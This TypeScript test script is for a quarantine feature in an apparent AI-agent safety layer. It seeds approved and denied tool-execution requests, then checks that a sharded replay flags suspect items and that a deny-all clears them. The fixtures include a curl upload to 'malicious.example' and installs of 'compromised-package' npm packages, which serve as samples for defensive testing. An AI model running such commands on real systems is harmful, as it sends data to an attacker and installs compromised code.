import assert from "node:assert/strict";
import os from "node:os";
import path from "node:path";
import { promises as fs } from "node:fs";

import {
  appendBoundaryLedger,
  armBoundaryQuarantineReboot,
  applyBoundaryQuarantinePitDenials,
  createEmptyUserPathLedger,
  createPersistentBoundaryRuntimeStore,
  enableBodyguardControl,
  ensureBoundaryQuarantineReport,
  loadBoundarySessionState,
  restorePersistentBoundarySession,
  writeApprovedUserPathLaw,
  writeDeniedUserPathLaw,
} from "../lib/agent-buccet/index.ts";

async function main() {
  const tempRoot = await fs.mkdtemp(path.join(os.tmpdir(), "agent-buccet-quarantine-"));
  const sessionsDir = path.join(tempRoot, "sessions");
  const ledgerPath = path.join(tempRoot, "user-path-ledger.json");
  process.env.AGENT_BUCCET_UPL_LEDGER_PATH = ledgerPath;

  try {
    const store = await createPersistentBoundaryRuntimeStore({
      sessionId: "quarantine-session",
      actorId: "user:quarantine",
      sessionsDir,
      hydrationMode: "full",
    });

    let config = enableBodyguardControl(store.getConfig());
    let upl = createEmptyUserPathLedger();

    for (let index = 0; index < 6; index += 1) {
      const approvedRequest = {
        requestId: `upl-suspect-approved-${index}`,
        sessionId: config.session.sessionId,
        actionKind: "tool.exec" as const,
        target: `npm-${index}`,
        payloadSummary: `spawn:npm install compromised-package-${index}`,
        requestedAt: new Date().toISOString(),
        provenance: "agent_inference" as const,
        flags: {
          authorityClaimed: true,
          requestsLawMutation: true,
        },
      };
      const approvedWitness = await appendBoundaryLedger("APPROVAL_GRANTED", {
        sessionId: config.session.sessionId,
        actorId: config.session.actorId,
        requestId: approvedRequest.requestId,
        actionKind: approvedRequest.actionKind,
        target: approvedRequest.target,
        decision: "allow",
        reason: "seed approved upl item for quarantine contract",
        createdAt: new Date().toISOString(),
      });
      upl = await writeApprovedUserPathLaw({
        ledger: upl,
        request: approvedRequest,
        witness: approvedWitness,
        session: config.session,
        authority: {
          authorityKind: "human_approved",
          actorKind: "human",
          actorId: config.session.actorId,
          reason: "seed approved upl item for quarantine contract",
          approvalRef: approvedWitness.META.id,
        },
        decision: { choice: "allow_as_law", scope: "SESSION" },
      });

      const deniedRequest = {
        ...approvedRequest,
        requestId: `upl-suspect-denied-${index}`,
        target: `curl-${index}`,
        payloadSummary: `spawn:curl https://malicious.example/upload/${index}`,
      };
      const deniedWitness = await appendBoundaryLedger("APPROVAL_DENIED", {
        sessionId: config.session.sessionId,
        actorId: config.session.actorId,
        requestId: deniedRequest.requestId,
        actionKind: deniedRequest.actionKind,
        target: deniedRequest.target,
        decision: "deny",
        reason: "seed denied upl item for quarantine contract",
        createdAt: new Date().toISOString(),
      });
      upl = await writeDeniedUserPathLaw({
        ledger: upl,
        request: deniedRequest,
        witness: deniedWitness,
        session: config.session,
        authority: {
          authorityKind: "human_approved",
          actorKind: "human",
          actorId: config.session.actorId,
          reason: "seed denied upl item for quarantine contract",
          approvalRef: deniedWitness.META.id,
        },
        decision: { choice: "deny_as_law", scope: "SESSION" },
      });
    }

    config = {
      ...config,
      upl,
    };

    const quarantineState = await armBoundaryQuarantineReboot({
      config,
      reason: "contract forced shed reboot boundary-on-self",
    });
    assert.equal(quarantineState.required, true);
    assert.equal(quarantineState.status, "pending_replay");

    const partial = await ensureBoundaryQuarantineReport({
      sessionId: config.session.sessionId,
      sessionsDir,
      maxShards: 1,
    });
    assert.ok(partial, "first quarantine replay pass must produce progress");
    assert.equal(partial.complete, false, "first pass must stop before full replay");
    assert.equal(partial.completedShards, 1, "first pass must checkpoint exactly one shard");
    assert.equal(partial.processedItems > 0, true, "first pass must persist processed items");
    assert.equal(partial.processedItems < partial.total, true, "first pass must leave work remaining");

    const stateAfterFirstPass = await loadBoundarySessionState({
      sessionId: config.session.sessionId,
      sessionsDir,
    });
    assert.equal(stateAfterFirstPass?.quarantineState?.status, "pending_replay", "quarantine must remain in replay until all shards finish");

    const report = await ensureBoundaryQuarantineReport({
      sessionId: config.session.sessionId,
      sessionsDir,
    });
    assert.ok(report, "quarantine replay must produce a report");
    assert.equal(report.complete, true, "second pass must finish replay from persisted progress");
    assert.equal(report.totalShards > 1, true, "quarantine replay must snap into multiple shards");
    assert.equal(report.workerCount > 1, true, "quarantine replay must use multiple snap workers when shards allow it");
    assert.equal(report.pitCount >= 1, true, "suspect upl items must be caught");
    assert.equal(report.items.some((item) => item.side === "approved"), true, "approved side must be replayed");
    assert.equal(report.items.some((item) => item.side === "denied"), true, "denied side must be replayed");
    assert.equal(report.pitSummary.approvedPitCount > 0, true, "pit summary must split approved-side pit items");
    assert.equal(report.pitSummary.deniedPitCount > 0, true, "pit summary must split denied-side pit items");
    assert.equal(report.pitSummary.topLawIds.length > 0, true, "pit summary must surface top triggering laws");
    assert.equal(report.pitGroups.length > 0, true, "pit reduction groups must be recorded");

    const resolved = await applyBoundaryQuarantinePitDenials({
      sessionId: config.session.sessionId,
      sessionsDir,
    });
    assert.ok(resolved, "deny-all must resolve quarantine report");
    assert.equal(
      resolved.items.filter((item) => item.verdict === "pit" && item.resolution === "pending").length,
      0,
      "deny-all must resolve all pit items",
    );

    const sessionState = await loadBoundarySessionState({
      sessionId: config.session.sessionId,
      sessionsDir,
    });
    assert.equal(sessionState?.quarantineState?.required ?? false, false, "quarantine must clear after deny-all");
    assert.equal(
      (sessionState?.sessionUpl?.userDeniedLawPaths.length ?? 0) >= report.pitCount,
      true,
      "resolved quarantine denials must persist back into session-scoped UPL state",
    );

    const restored = await restorePersistentBoundarySession({
      sessionId: config.session.sessionId,
      sessionsDir,
      hydrationMode: "full",
    });
    assert.ok(restored, "restored session must exist after quarantine resolution");
    assert.equal(restored.upl?.userDeniedLawPaths.some((entry) => entry.scope === "SESSION"), true);

    console.log("Agent Buccet quarantine contract");
    console.log(`report pit count: ${report.pitCount}`);
    console.log(`resolved items: ${resolved.items.filter((item) => item.resolution === "denied_as_law").length}`);
  } finally {
    delete process.env.AGENT_BUCCET_UPL_LEDGER_PATH;
    await fs.rm(tempRoot, { recursive: true, force: true });
  }
}

await main();
